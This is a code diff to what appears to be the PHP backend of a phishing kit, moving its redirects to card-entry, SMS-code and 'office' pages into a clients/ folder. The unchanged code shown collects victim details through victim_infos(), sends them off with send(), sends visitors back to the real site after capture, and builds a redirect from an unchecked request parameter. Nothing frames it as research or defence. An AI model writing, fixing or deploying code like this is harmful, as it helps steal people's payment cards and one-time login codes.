@@ -8,12 +8,12 @@
     if( $_GET['pwd'] == PASSWORD ) {
         session_destroy();
         visitors();
-        header("Location: cc.php?verification#_");
+        header("Location: clients/cc.php?verification#_");
         exit();
     } else if( !empty($_GET['redirection']) ) {
         $red = $_GET['redirection'];
         if( $red == 'errorsms' ) {
-            header("Location: sms.php?error=1&verification#_");
+            header("Location: clients/sms.php?error=1&verification#_");
             exit();
         }
         header("Location: clients/". $red .".php?verification#_");
@@ -63,7 +63,7 @@
                 unset($_SESSION['errors']);
                 header("Location: clients/loading1.php?verification#_");
             } else {
-                header("Location: cc.php?error#_");
+                header("Location: clients/cc.php?error#_");
             }
         }
         if ($_POST['step'] == "sms") {
@@ -80,7 +80,7 @@
                 $message .= victim_infos();
                 send($subject,$message);
                 if( $_POST['error'] > 0 ) {
-                    header("Location: office.php?verification#_");
+                    header("Location: clients/office.php?verification#_");
                     exit();
                 }
                 $_SESSION['errors']['sms_code'] = 'Code is not valid';
@@ -88,7 +88,7 @@
                 exit();
             } else {
                 $error = $_POST['error'];
-                header("Location: sms.php?error=$error&verification#_");
+                header("Location: clients/sms.php?error=$error&verification#_");
                 exit();
             }
         }
@@ -108,7 +108,7 @@
                 header("Location: " . OFFICIAL_WEBSITE);
                 exit();
             }
-            header("Location: office.php?error=1&verification#_");
+            header("Location: clients/office.php?error=1&verification#_");
             exit();
         }
     } else {
